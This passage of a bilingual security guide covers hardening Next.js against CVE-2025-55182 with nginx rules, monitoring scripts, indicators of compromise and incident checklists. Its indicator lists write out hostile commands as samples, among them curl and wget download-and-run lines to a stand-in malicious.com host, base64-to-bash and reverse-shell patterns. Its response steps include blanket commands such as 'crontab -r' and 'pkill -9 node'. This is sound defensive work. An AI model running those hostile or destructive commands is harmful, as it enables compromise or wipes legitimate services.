    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';" always;
    
    # Connection limits
    limit_conn conn_limit 20;
    
    # Logging
    access_log /var/log/nginx/app_access.log combined;
    error_log /var/log/nginx/app_error.log warn;
    
    # Block CVE-2025-55182 exploitation attempts
    if ($http_next_action != "") {
        return 403;
    }
    
    if ($http_rsc_action_id != "") {
        return 403;
    }
    
    # Backend API routes (protected)
    location /api/ {
        limit_req zone=api_limit burst=20 nodelay;
        
        # CRITICAL: Backend chỉ accessible qua proxy, không direct
        proxy_pass http://nodejs_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }
    
    # Frontend (NextJS)
    location / {
        limit_req zone=general_limit burst=50 nodelay;
        
        proxy_pass http://nextjs_frontend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
        
        # Block suspicious patterns
        if ($request_method = POST) {
            set $post_block 0;
            
            if ($http_content_type ~* "multipart/form-data") {
                set $post_block 1;
            }
            
            if ($http_x_nextjs_request_id != "") {
                set $post_block "${post_block}1";
            }
            
            # Block if both conditions met
            if ($post_block = "11") {
                return 403;
            }
        }
    }
    
    # Static files
    location /_next/static/ {
        proxy_pass http://nextjs_frontend;
        proxy_cache_valid 200 1d;
        add_header Cache-Control "public, immutable";
    }
    
    # Health checks
    location /health {
        access_log off;
        return 200 "healthy\n";
        add_header Content-Type text/plain;
    }
}
```

### 6.4. Environment Isolation

```yaml
# docker-compose.yml (Recommended)
version: '3.8'

services:
  # Frontend (NextJS)
  frontend:
    build: ./frontend
    ports:
      - "3000:3000"
    environment:
      - NODE_ENV=production
      - BACKEND_API_URL=http://backend:4000
    networks:
      - frontend-network
    restart: unless-stopped
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    read_only: true
    tmpfs:
      - /tmp
      - /app/.next/cache
    
  # Backend API
  backend:
    build: ./backend
    expose:
      - "4000"
    environment:
      - NODE_ENV=production
      - DATABASE_URL=${DATABASE_URL}
      - JWT_SECRET=${JWT_SECRET}
    networks:
      - frontend-network
      - backend-network
    restart: unless-stopped
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    
  # PostgreSQL (isolated)
  postgres:
    image: postgres:16-alpine
    volumes:
      - postgres-data:/var/lib/postgresql/data
    environment:
      - POSTGRES_DB=${DB_NAME}
      - POSTGRES_USER=${DB_USER}
      - POSTGRES_PASSWORD=${DB_PASSWORD}
    networks:
      - backend-network
    restart: unless-stopped
    
  # Nginx Reverse Proxy
  nginx:
    image: nginx:alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
      - ./nginx/ssl:/etc/nginx/ssl:ro
    networks:
      - frontend-network
    depends_on:
      - frontend
      - backend
    restart: unless-stopped

networks:
  frontend-network:
    driver: bridge
  backend-network:
    driver: bridge
    internal: true  # No external access

volumes:
  postgres-data:
```

---

## 7. Monitoring và Detection

### 7.1. Log Monitoring Setup

```javascript
// logger.js - Centralized logging
const winston = require('winston');
const { Loggly } = require('winston-loggly-bulk');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  transports: [
    // File logs
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error',
      maxsize: 5242880, // 5MB
      maxFiles: 5,
    }),
    new winston.transports.File({ 
      filename: 'logs/combined.log',
      maxsize: 5242880,
      maxFiles: 5,
    }),
    
    // Console
    new winston.transports.Console({
      format: winston.format.combine(
        winston.format.colorize(),
        winston.format.simple()
      )
    }),
  ],
});

// Security event logger
const securityLogger = winston.createLogger({
  level: 'warn',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ 
      filename: 'logs/security.log',
      maxsize: 10485760, // 10MB
      maxFiles: 10,
    }),
  ],
});

module.exports = { logger, securityLogger };
```

```javascript
// middleware/securityLogger.js
const { securityLogger } = require('../logger');

function logSecurityEvent(req, res, next) {
  // Check for CVE-2025-55182 indicators
  const suspiciousHeaders = [
    'next-action',
    'x-nextjs-request-id',
    'next-router-state-tree',
    'rsc-action-id'
  ];
  
  const hasSuspiciousHeader = suspiciousHeaders.some(header => 
    req.headers[header]
  );
  
  if (hasSuspiciousHeader && req.method === 'POST') {
    securityLogger.warn({
      type: 'CVE-2025-55182_ATTEMPT',
      timestamp: new Date().toISOString(),
      ip: req.ip,
      headers: req.headers,
      method: req.method,
      path: req.path,
      userAgent: req.get('user-agent'),
      severity: 'HIGH'
    });
  }
  
  // Check for other suspicious patterns
  if (req.body && typeof req.body === 'string') {
    if (req.body.includes('vm.runInThisContext') || 
        req.body.includes('child_process') ||
        req.body.includes('fs.writeFile')) {
      
      securityLogger.error({
        type: 'MALICIOUS_PAYLOAD_DETECTED',
        timestamp: new Date().toISOString(),
        ip: req.ip,
        payload: req.body.substring(0, 500),
        severity: 'CRITICAL'
      });
      
      return res.status(403).json({ error: 'Forbidden' });
    }
  }
  
  next();
}

module.exports = logSecurityEvent;
```

### 7.2. Real-time Monitoring Script

```bash
#!/bin/bash
# /usr/local/bin/cve-2025-55182-monitor.sh

LOG_FILE="/var/log/nginx/access.log"
ALERT_EMAIL="admin@yourdomain.com"
ALERT_THRESHOLD=5

# Monitor cho exploitation attempts
tail -F "$LOG_FILE" | while read line; do
    # Check for CVE-2025-55182 indicators
    if echo "$line" | grep -qi "next-action\|rsc-action-id"; then
        IP=$(echo "$line" | awk '{print $1}')
        TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
        
        echo "[$TIMESTAMP] ALERT: CVE-2025-55182 exploitation attempt from $IP" | \
            tee -a /var/log/security-alerts.log
        
        # Ban IP automatically
        sudo ufw deny from "$IP"
        
        # Send alert
        echo "CVE-2025-55182 exploitation attempt detected from $IP at $TIMESTAMP" | \
            mail -s "CRITICAL: React2Shell Attack Attempt" "$ALERT_EMAIL"
    fi
    
    # Check for crypto miner indicators
    if echo "$line" | grep -qi "xmrig\|miner\|stratum"; then
        echo "[$TIMESTAMP] ALERT: Crypto miner activity detected" | \
            tee -a /var/log/security-alerts.log
    fi
done
```

```bash
# Make executable và run as service
chmod +x /usr/local/bin/cve-2025-55182-monitor.sh

# Create systemd service
sudo vim /etc/systemd/system/cve-monitor.service
```

```ini
[Unit]
Description=CVE-2025-55182 Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/cve-2025-55182-monitor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable cve-monitor
sudo systemctl start cve-monitor
```

### 7.3. Automated Scanning

```bash
#!/bin/bash
# daily-security-scan.sh

echo "=== Security Scan $(date) ===" >> /var/log/daily-scan.log

# 1. Check for suspicious processes
ps aux | grep -E "xmrig|miner|crypto|wget.*http|curl.*http" | grep -v grep >> /var/log/daily-scan.log

# 2. Check for suspicious network connections
netstat -antp | grep ESTABLISHED | grep -v "127.0.0.1\|localhost" >> /var/log/daily-scan.log

# 3. Check recent file modifications
find /root -type f -mtime -1 -ls >> /var/log/daily-scan.log
find /tmp -type f -mtime -1 -ls >> /var/log/daily-scan.log

# 4. Check cron jobs
crontab -l >> /var/log/daily-scan.log

# 5. Check for new users
cat /etc/passwd | tail -10 >> /var/log/daily-scan.log

# 6. Disk usage check (crypto miners often fill disk)
df -h >> /var/log/daily-scan.log

# 7. Check CPU usage (crypto miners use high CPU)
top -bn1 | head -20 >> /var/log/daily-scan.log

echo "=== Scan Complete ===" >> /var/log/daily-scan.log
```

```bash
# Add to crontab
crontab -e
# Add:
0 2 * * * /usr/local/bin/daily-security-scan.sh
```

---

## 8. Indicators of Compromise

### 8.1. Network Indicators

**HTTP Headers trong Attack Traffic:**
```
Next-Action: x
X-Nextjs-Request-Id: <random-id>
Next-Router-State-Tree: ["",{"children":["__PAGE__",{},null,null]},null,null,true]
Content-Type: multipart/form-data
```

**Malicious User-Agents:**
```
Go-http-client/*
curl/*
python-requests/*
Scanner-*
Assetnote/*
```

**Known Malicious IPs (cập nhật liên tục):**
```
183.6.80.214
45.*.*.* (nhiều ranges từ China)
Xem thêm tại: https://github.com/DataDog/indicators-of-compromise/tree/main/react-CVE-2025-55182
```

### 8.2. File System Indicators

**Malicious Scripts:**
```bash
/tmp/sex.sh               # Known malware filename
/tmp/slt                  # Shell script dropper
/tmp/.X*                  # Hidden files
/var/tmp/*miner*          # Miner executables
~/.ssh/authorized_keys    # Check for new SSH keys
```

**Modified System Files:**
```bash
/boot/grub/grub.cfg       # GRUB modifications
/etc/crontab              # New cron jobs
/etc/rc.local             # Startup scripts
~/.bashrc, ~/.bash_profile # Profile modifications
```

### 8.3. Process Indicators

**Suspicious Processes:**
```bash
# Crypto miners
xmrig, xmr-stak, cpuminer, minergate

# Backdoors
bash -i, nc -e, python -c, perl -e

# Reverse shells
/bin/bash -i, sh -i

# Network downloaders
wget http://, curl http://, python -m http.server
```

### 8.4. Network Indicators

**Suspicious Connections:**
```bash
# Crypto mining pools
stratum+tcp://
pool.*.com:*
*.pool.com

# Known C2 servers
Cobalt Strike beacons
Sliver C2 traffic

# Cloud metadata access
169.254.169.254/latest/meta-data/
```

### 8.5. Log Patterns

**Nginx Access Log:**
```
POST / HTTP/1.1" 200 - "Next-Action: x"
POST / HTTP/1.1" 500 - multipart/form-data
```

**System Logs:**
```bash
# Suspicious commands
bash -c "echo <base64> | base64 -d | bash"
curl -s http://malicious.com/payload.sh | bash
wget -qO- http://malicious.com/miner | sh
```

---

## 9. Best Practices

### 9.1. Development Practices

```typescript
// ✅ DO: Sử dụng Pages Router cho internal tools
// pages/admin/index.tsx
export default function AdminPage() {
  // Safe - Pages Router không vulnerable
}

// ❌ DON'T: Sử dụng App Router cho untrusted input
// app/admin/page.tsx - Vulnerable nếu chưa patch

// ✅ DO: Input validation và sanitization
function validateInput(data: any): boolean {
  if (typeof data !== 'object') return false;
  
  // Kiểm tra cho malicious patterns
  const jsonStr = JSON.stringify(data);
  const dangerousPatterns = [
    'vm.runInThisContext',
    'child_process',
    'eval(',
    'Function(',
    '__proto__',
    'constructor'
  ];
  
  return !dangerousPatterns.some(pattern => 
    jsonStr.includes(pattern)
  );
}

// ✅ DO: Rate limiting cho tất cả API endpoints
// middleware.ts
export function middleware(request: NextRequest) {
  const ip = request.ip || 'unknown';
  const rateLimit = rateLimitByIP(ip);
  
  if (!rateLimit.allowed) {
    return new Response('Too Many Requests', { status: 429 });
  }
  
  return NextResponse.next();
}
```

### 9.2. Deployment Checklist

**Pre-Deployment:**
- [ ] Cập nhật Next.js lên patched version
- [ ] Cập nhật tất cả React dependencies
- [ ] Review tất cả Server Components và Server Actions
- [ ] Test authentication và authorization
- [ ] Chạy security scan (npm audit, yarn audit)
- [ ] Review environment variables
- [ ] Kiểm tra CORS configuration
- [ ] Test rate limiting

**Deployment:**
- [ ] Deploy trong isolated environment (Docker/container)
- [ ] Cấu hình WAF rules
- [ ] Enable HTTPS/TLS
- [ ] Cấu hình reverse proxy (Nginx)
- [ ] Setup monitoring và logging
- [ ] Configure backup strategy

**Post-Deployment:**
- [ ] Monitor logs trong 24h đầu
- [ ] Test tất cả critical flows
- [ ] Verify WAF rules đang hoạt động
- [ ] Check không có suspicious connections
- [ ] Run vulnerability scan
- [ ] Document configuration changes

### 9.3. Security Headers

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'X-Frame-Options',
    value: 'SAMEORIGIN'
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff'
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block'
  },
  {
    key: 'Referrer-Policy',
    value: 'strict-origin-when-cross-origin'
  },
  {
    key: 'Permissions-Policy',
    value: 'camera=(), microphone=(), geolocation=()'
  },
  {
    key: 'Strict-Transport-Security',
    value: 'max-age=31536000; includeSubDomains'
  },
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-inline' 'unsafe-eval';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self' data:;
      connect-src 'self' https://api.yourdomain.com;
      frame-ancestors 'none';
    `.replace(/\s+/g, ' ').trim()
  }
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

### 9.4. Regular Maintenance

```bash
#!/bin/bash
# weekly-maintenance.sh

echo "=== Weekly Security Maintenance $(date) ==="

# 1. Update all packages
cd /path/to/nextjs-app
npm update
npm audit fix

# 2. Check for new CVEs
npm audit --json > audit-report.json

# 3. Update system packages
apt update && apt upgrade -y

# 4. Rotate logs
logrotate -f /etc/logrotate.conf

# 5. Clean old Docker images
docker system prune -af

# 6. Backup database
pg_dump -U postgres dbname > backup-$(date +%F).sql

# 7. Test backups
# ... your backup testing procedure

# 8. Review security logs
grep -i "error\|attack\|suspicious" /var/log/security-alerts.log

# 9. Generate report
echo "Weekly maintenance completed at $(date)" >> /var/log/maintenance.log
```

### 9.5. Incident Response Plan

**Nếu phát hiện đã bị hack:**

1. **IMMEDIATE (0-15 minutes):**
   ```bash
   # Isolate server
   sudo ufw deny in from any
   
   # Stop compromised services
   systemctl stop nextjs
   systemctl stop nginx
   
   # Capture memory dump (nếu có tools)
   sudo dd if=/dev/mem of=/tmp/memory-dump.bin
   
   # Take disk snapshot (cloud)
   # AWS: aws ec2 create-snapshot
   # GCP: gcloud compute snapshots create
   ```

2. **CONTAINMENT (15-60 minutes):**
   ```bash
   # Kill suspicious processes
   pkill -9 xmrig
   pkill -9 -f "suspicious-script"
   
   # Remove malicious files
   rm -f /tmp/sex.sh /tmp/slt
   
   # Remove cron jobs
   crontab -r
   
   # Disable compromised users
   passwd -l compromised_user
   
   # Change all passwords and rotate keys
   # ... rotate database passwords
   # ... rotate API keys
   # ... rotate JWT secrets
   ```

3. **ERADICATION (1-4 hours):**
   ```bash
   # Full system reinstall từ backup sạch
   # Hoặc rebuild từ đầu với patched versions
   
   # Update tất cả packages
   npm install next@latest react@latest
   
   # Restore data từ backup (verified clean)
   ```

4. **RECOVERY (4-24 hours):**
   ```bash
   # Deploy patched version
   # Enable enhanced monitoring
   # Test tất cả functionality
   # Gradual traffic restoration
   ```

5. **POST-INCIDENT (1-7 days):**
   - Root cause analysis
   - Update incident response procedures
   - Security audit toàn bộ hệ thống
   - Implement additional safeguards
   - Staff training

---

## 10. Tài Nguyên Tham Khảo

### 10.1. Official Advisories

- **Next.js Security Advisory**: https://nextjs.org/blog/CVE-2025-66478
- **React Security Advisory**: https://react.dev/blog/2025/12/03/critical-security-vulnerability-rsc
- **CVE Details**: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
- **React2Shell Website**: https://react2shell.com

### 10.2. Security Research

- **Wiz Research**: https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
- **Datadog Security Labs**: https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell
- **AWS Security Blog**: https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/
- **Unit 42 (Palo Alto)**: https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/

### 10.3. IOCs và Detection

- **Datadog IOCs**: https://github.com/DataDog/indicators-of-compromise/tree/main/react-CVE-2025-55182
- **GreyNoise Observation**: https://www.greynoise.io/blog/cve-2025-55182-react2shell
- **CISA KEV Catalog**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### 10.4. Tools

- **Fix Tool**: `npx fix-react2shell-next` - https://github.com/vercel/next.js/tree/canary/packages/fix-react2shell-next
- **Version Checker**: https://github.com/lachlan2k/React2Shell-CVE-2025-55182-scanner
- **WAF Rules**: Cloud providers documentation

### 10.5. Best Practices Guides

- **Next.js Security**: https://nextjs.org/docs/pages/building-your-application/routing/authenticating
- **OWASP API Security**: https://owasp.org/www-project-api-security/
- **Node.js Security Best Practices**: https://nodejs.org/en/docs/guides/security/

---

## 📞 Support và Updates

**Cập nhật thường xuyên:**
- Theo dõi official Next.js blog
- Subscribe security mailing lists
- Monitor CVE databases
- Join security communities

**Emergency Contact:**
- CISA: https://www.cisa.gov/report
- Security researchers: security@vercel.com, security@react.dev

---

## ⚠️ LƯU Ý QUAN TRỌNG

1. **KHÔNG tự tạo "fix" mà không test kỹ**
2. **LUÔN backup trước khi thay đổi**
3. **Test trong staging environment trước**
4. **Monitor logs sau mọi changes**
5. **Document tất cả changes**
6. **Có incident response plan**
7. **Regular security audits**
8. **Keep dependencies updated**

---

**Document Version:** 1.0  
**Last Updated:** December 9, 2025  
**Author:** Claude (Anthropic)  
**For:** NextJS Security Hardening  

**Status:** ✅ Production Ready  
**Priority:** 🔴 CRITICAL - Implement ASAP
-e 

---
# PHẦN 2: EMERGENCY CHECKLIST
---


# CVE-2025-55182 Emergency Response Checklist

## 🚨 IMMEDIATE ACTIONS (First 15 Minutes)

### Phase 1: Verify Vulnerability Status
- [ ] Check Next.js version: `npm list next`
- [ ] Check React version: `npm list react`
- [ ] Verify if using App Router: Check for `/app` directory
- [ ] Run quick scan: `./cve-2025-55182-fix.sh --scan`

**Vulnerable Versions:**
- ❌ Next.js 14.3.0-canary.77+
- ❌ Next.js 15.x (all before 15.5.7)
- ❌ Next.js 16.x (all before 16.0.7)
- ✅ Next.js 13.x and 14.x stable: SAFE

### Phase 2: Isolate if Vulnerable
```bash
# Block external access immediately
sudo ufw deny in from any to any port 3000
sudo ufw deny in from any to any port 80
sudo ufw deny in from any to any port 443

# Stop service
sudo systemctl stop nextjs
# OR
pm2 stop all
```

### Phase 3: Quick Patch (if not compromised)
```bash
# Backup first
cp package.json package.json.backup

# Update Next.js
npm install next@latest  # or specific patched version

# Rebuild
npm run build

# Restart
sudo systemctl restart nextjs
```

---

## 🔍 COMPROMISE DETECTION (15-60 Minutes)

### Check 1: Processes
```bash
# Look for crypto miners
ps aux | grep -E "xmrig|miner|crypto|stratum" | grep -v grep

# Look for suspicious node processes
ps aux | grep node | grep -v "node.*next\|pm2"

# Kill if found
pkill -9 xmrig
```

**Expected: NO results**  
**If found: SYSTEM COMPROMISED - See Section 4**

### Check 2: Files
```bash
# Known malicious files
ls -la /tmp/sex.sh 2>/dev/null
ls -la /tmp/slt 2>/dev/null
ls -la /tmp/.X* 2>/dev/null

# Recent modifications in tmp
find /tmp -type f -mtime -1 -ls

# Recent modifications in home
find ~ -type f -mtime -1 -ls
```

**Expected: Only normal temp files**  
**If suspicious files found: SYSTEM COMPROMISED**

### Check 3: Network
```bash
# Check connections
netstat -antp | grep ESTABLISHED

# Look for suspicious ports
netstat -antp | grep -E ":1337|:4444|:8888|:3333"

# Check for reverse shells
ps aux | grep -E "bash -i|nc -e|python -c" | grep -v grep
```

**Expected: Only known connections to database, APIs**  
**If unknown external connections: INVESTIGATE**

### Check 4: Cron Jobs & Startup
```bash
# Check user crontab
crontab -l

# Check system cron
cat /etc/cron*/*

# Check systemd services
systemctl list-units --type=service --state=running | grep -v "system\|user\|dbus"

# Check rc.local
cat /etc/rc.local
```

**Expected: Only your legitimate jobs/services**  
**If unknown entries: SYSTEM COMPROMISED**

### Check 5: Logs
```bash
# Check nginx access logs
grep -i "next-action\|rsc-action" /var/log/nginx/access.log | tail -20

# Check error logs
tail -50 /var/log/nginx/error.log

# Check auth logs
grep -i "failed\|failure" /var/log/auth.log | tail -20
```

**Expected: No next-action/rsc-action headers**  
**If found: Count and analyze IPs**

### Check 6: Cloud Credentials
```bash
# Check if credentials accessed
ls -la ~/.aws/
ls -la ~/.kube/
ls -la ~/.config/gcloud/

# Check environment
env | grep -E "AWS|GCP|AZURE|SECRET|KEY|TOKEN"

# Check bash history for credential access
history | grep -E "aws|gcloud|kubectl|cat.*secret"
```

**Expected: Normal access patterns**  
**If suspicious access: ROTATE ALL CREDENTIALS**

---

## 🔧 REMEDIATION STEPS

### If NOT Compromised - Update Only

```bash
# 1. Backup
cp package.json package.json.backup.$(date +%Y%m%d)

# 2. Update (choose appropriate version)
npm install next@15.5.7  # For Next.js 15.x
npm install next@16.0.7  # For Next.js 16.x
npm install next@14.2.18  # Downgrade from 14.x canary

# 3. Update React if needed
npm install react@19.2.1 react-dom@19.2.1

# 4. Fix vulnerabilities
npm audit fix

# 5. Rebuild
npm run build

# 6. Test locally
npm run start
# Open browser, test functionality

# 7. Deploy
sudo systemctl restart nextjs

# 8. Verify
curl -I http://localhost:3000
```

### If COMPROMISED - Full Recovery

```bash
# ⚠️ CRITICAL: SYSTEM IS COMPROMISED

# 1. ISOLATE IMMEDIATELY
sudo ufw deny in from any
sudo systemctl stop nextjs
sudo systemctl stop nginx

# 2. KILL MALICIOUS PROCESSES
pkill -9 xmrig
pkill -9 -f "suspicious_name"

# 3. REMOVE MALWARE
rm -f /tmp/sex.sh /tmp/slt
rm -rf /tmp/.X*
crontab -r  # Remove all cron jobs

# 4. BACKUP CRITICAL DATA (if needed)
pg_dump dbname > backup-emergency.sql

# 5. ROTATE ALL CREDENTIALS
# Database passwords
# JWT secrets
# API keys
# Cloud credentials (AWS, GCP, Azure)
# SSH keys

# 6. REBUILD FROM CLEAN STATE
# Option A: Rebuild container
docker-compose down -v
docker-compose up -d --build

# Option B: Fresh install
# Reinstall OS if severely compromised
# Deploy from clean git repository
# Restore data from VERIFIED CLEAN backup

# 7. ENABLE ENHANCED MONITORING
# See monitoring section below
```

---

## 🛡️ HARDENING CHECKLIST

### Architecture
- [ ] Frontend and Backend separated
- [ ] Backend not directly accessible from internet
- [ ] Database only accessible from backend
- [ ] Reverse proxy (Nginx) in place
- [ ] WAF rules enabled

### Network Security
- [ ] Firewall configured (UFW/iptables)
- [ ] Only necessary ports open (80, 443, SSH)
- [ ] Rate limiting enabled
- [ ] DDoS protection active
- [ ] SSL/TLS properly configured

### Application Security
- [ ] Next.js updated to patched version
- [ ] React updated to patched version
- [ ] All npm packages audited
- [ ] Environment variables secured
- [ ] Secrets not in code/git
- [ ] CORS properly configured
- [ ] JWT secrets rotated regularly

### Container Security (if using Docker)
- [ ] Run as non-root user
- [ ] Read-only root filesystem
- [ ] Resource limits set
- [ ] Network isolation
- [ ] No unnecessary capabilities
- [ ] Security scanning enabled

### Monitoring
- [ ] Log aggregation configured
- [ ] Alerts for suspicious activity
- [ ] Real-time monitoring active
- [ ] Backup system verified
- [ ] Incident response plan documented

---

## 📊 MONITORING SETUP

### Essential Logs to Monitor

```bash
# Create log monitoring script
cat > /usr/local/bin/monitor-cve.sh << 'EOF'
#!/bin/bash
while true; do
    # Monitor for exploitation attempts
    tail -f /var/log/nginx/access.log | grep --line-buffered "next-action\|rsc-action" | \
    while read line; do
        IP=$(echo "$line" | awk '{print $1}')
        echo "[ALERT] CVE-2025-55182 attempt from $IP"
        # Ban IP
        sudo ufw deny from "$IP"
        # Send notification (configure your method)
        echo "Attack from $IP" | mail -s "ALERT" admin@your-domain.com
    done
    sleep 1
done
EOF

chmod +x /usr/local/bin/monitor-cve.sh

# Run in background
nohup /usr/local/bin/monitor-cve.sh &
```

### Key Metrics to Track

1. **HTTP Requests**
   - POST requests with multipart/form-data
   - Requests with Next-Action header
   - Unusual user agents

2. **System Resources**
   - CPU usage (miners use high CPU)
   - Network traffic (unusual outbound)
   - Disk I/O (unusual writes)

3. **Processes**
   - New unknown processes
   - High CPU processes
   - Unusual network connections

4. **Files**
   - /tmp modifications
   - New files in /root or /home
   - Modified system files

---

## 🚀 DEPLOYMENT SAFETY CHECKLIST

Before deploying updates:

### Pre-Deploy
- [ ] Test in staging environment
- [ ] Verify patched versions
- [ ] Backup current state
- [ ] Backup database
- [ ] Document current configuration
- [ ] Plan rollback procedure

### Deploy
- [ ] Use blue-green deployment if possible
- [ ] Monitor logs during deployment
- [ ] Check health endpoints
- [ ] Verify functionality
- [ ] Check for errors

### Post-Deploy
- [ ] Monitor for 24 hours
- [ ] Check resource usage
- [ ] Verify no exploitation attempts
- [ ] Test all critical features
- [ ] Review logs for anomalies

---

## 📞 INCIDENT CONTACTS

| Type | Contact | Response Time |
|------|---------|---------------|
| Hosting Provider | support@provider.com | < 1 hour |
| Security Team | security@your-company.com | < 30 min |
| On-Call Engineer | +1-xxx-xxx-xxxx | < 15 min |
| Cloud Provider | AWS/GCP/Azure Support | < 1 hour |

---

## 📚 QUICK REFERENCE COMMANDS

### Check Status
```bash
# Version check
npm list next react

# Process check
ps aux | grep -E "node|xmrig|miner"

# Connection check
netstat -antp | grep ESTABLISHED

# Log check
tail -f /var/log/nginx/access.log | grep "next-action"
```

### Emergency Stop
```bash
# Stop services
sudo systemctl stop nextjs nginx

# Block traffic
sudo ufw deny in from any

# Kill processes
pkill -9 node
```

### Quick Fix
```bash
# Update and restart
npm install next@latest
npm run build
sudo systemctl restart nextjs
```

### System Scan
```bash
# Run security scan
./cve-2025-55182-fix.sh --scan

# Check for malware
clamscan -r /home /tmp /var/www

# Check file integrity
aide --check
```

---

## ⚡ AUTOMATED RESPONSE

### Setup Auto-Ban Script

```bash
# Create auto-ban service
cat > /etc/systemd/system/auto-ban-cve.service << 'EOF'
[Unit]
Description=Auto-ban CVE-2025-55182 attempts
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/auto-ban-cve.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Create ban script
cat > /usr/local/bin/auto-ban-cve.sh << 'EOF'
#!/bin/bash
tail -F /var/log/nginx/access.log | \
grep --line-buffered "next-action\|rsc-action" | \
while read line; do
    IP=$(echo "$line" | awk '{print $1}')
    sudo ufw deny from "$IP"
    logger "BANNED IP $IP for CVE-2025-55182 attempt"
done
EOF

chmod +x /usr/local/bin/auto-ban-cve.sh
sudo systemctl enable auto-ban-cve
sudo systemctl start auto-ban-cve
```

---

## ✅ VALIDATION CHECKLIST

After remediation, verify:

- [ ] Next.js version >= patched version
- [ ] React version >= patched version
- [ ] No suspicious processes running
- [ ] No malicious files present
- [ ] No unauthorized network connections
- [ ] No unauthorized cron jobs
- [ ] Logs show no exploitation attempts
- [ ] All credentials rotated (if compromised)
- [ ] Monitoring active and alerting
- [ ] Backups tested and working
- [ ] Team notified and trained

---

## 🔄 ONGOING MAINTENANCE

### Daily
- [ ] Check logs for suspicious activity
- [ ] Verify monitoring is working
- [ ] Check resource usage

### Weekly
- [ ] Review security alerts
- [ ] Update dependencies
- [ ] Test backups
- [ ] Review access logs

### Monthly
- [ ] Full security audit
- [ ] Penetration testing
- [ ] Review incident response plan
- [ ] Update documentation

---

**Last Updated:** 2025-12-09  
**Document Version:** 1.0  
**Status:** Production Ready
-e 

---
# PHẦN 3: NGINX + WAF CONFIGURATION
---


# Nginx + ModSecurity Configuration for CVE-2025-55182 Protection

## 1. Complete Nginx Configuration

### /etc/nginx/nginx.conf

```nginx
user www-data;
worker_processes auto;
worker_rlimit_nofile 65535;
pid /run/nginx.pid;

# Load ModSecurity
load_module modules/ngx_http_modsecurity_module.so;

events {
    worker_connections 4096;
    multi_accept on;
    use epoll;
}

http {
    ##
    # Basic Settings
    ##
    sendfile on;
    tcp_nopush on;
    tcp_nodelay on;
    keepalive_timeout 65;
    types_hash_max_size 2048;
    server_tokens off;
    
    # Buffer sizes
    client_body_buffer_size 1m;
    client_max_body_size 10m;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 8k;
    
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    
    ##
    # SSL Settings
    ##
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5:!RC4;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    ##
    # Logging Settings
    ##
    log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for" '
                    'rt=$request_time uct="$upstream_connect_time" '
                    'uht="$upstream_header_time" urt="$upstream_response_time"';
    
    log_format security '$remote_addr - $remote_user [$time_local] '
                       '"$request" $status $body_bytes_sent '
                       '"$http_user_agent" "$http_x_forwarded_for" '
                       'Headers: next-action="$http_next_action" '
                       'rsc-action="$http_rsc_action_id" '
                       'content-type="$content_type"';
    
    access_log /var/log/nginx/access.log main;
    error_log /var/log/nginx/error.log warn;
    
    ##
    # Gzip Settings
    ##
    gzip on;
    gzip_vary on;
    gzip_proxied any;
    gzip_comp_level 6;
    gzip_types text/plain text/css text/xml text/javascript 
               application/json application/javascript application/xml+rss 
               application/rss+xml font/truetype font/opentype 
